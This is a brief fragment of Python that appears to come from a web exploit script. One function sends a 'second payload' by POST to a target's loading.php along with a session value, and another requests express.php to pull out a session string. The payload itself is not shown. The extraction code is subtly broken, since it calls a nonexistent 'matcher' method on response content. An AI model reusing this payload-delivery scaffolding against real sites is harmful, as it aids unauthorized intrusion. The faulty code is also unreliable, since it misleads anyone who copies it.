...
def fire_second_payload(payload, base_url, session):
    requests.post(f"{base_url}/loading.php?ssl=true&session={session}", data=payload)


def get_session_from_website(url):
    r = requests.get(f"{url}/express.php")
    session = r.content.matcher("session=\"{}\"")
